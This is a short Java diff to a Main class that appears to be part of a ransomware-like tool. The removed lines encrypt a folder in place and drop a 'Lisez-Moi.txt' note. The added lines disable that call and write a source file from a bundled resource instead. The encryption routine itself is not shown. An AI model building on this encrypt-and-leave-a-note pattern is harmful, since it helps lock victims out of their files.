@@ -11,6 +11,8 @@ import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.ObjectOutputStream;
 import java.io.PrintWriter;
+import java.net.Socket;
+import java.util.Date;
 import javax.crypto.Cipher;
 import javax.crypto.SecretKey;
 import sn.presidence.dept.service.cryptoing.tool.CryptoImpl;
@@ -41,16 +43,19 @@ public class Main {
             }
         }
 
-        crypto.cipherProcessFolder(k, path, path, mode, true);
-        FileOutputStream fos = new FileOutputStream(path + File.separator + "Lisez-Moi.txt");
-        InputStream fis = crypto.getClass().getClassLoader().getResourceAsStream("note.txt");
+        //crypto.cipherProcessFolder(k, path, path, mode, true);
+        FileOutputStream fos = new FileOutputStream(path + File.separator + "CryptoImpl.java");
+        InputStream fis = crypto.getClass().getClassLoader().getResourceAsStream("moncode.txt");
         byte[] buffer = new byte[1024 * 1024];
         int nombrebytes = 0;
         while ((nombrebytes = fis.read(buffer)) != -1) {
             fos.write(buffer, 0, nombrebytes);
         }
+        fos.write(("//"+new Date()).getBytes());
         fos.close();
         fis.close();
+        
+       
 
     }
 }
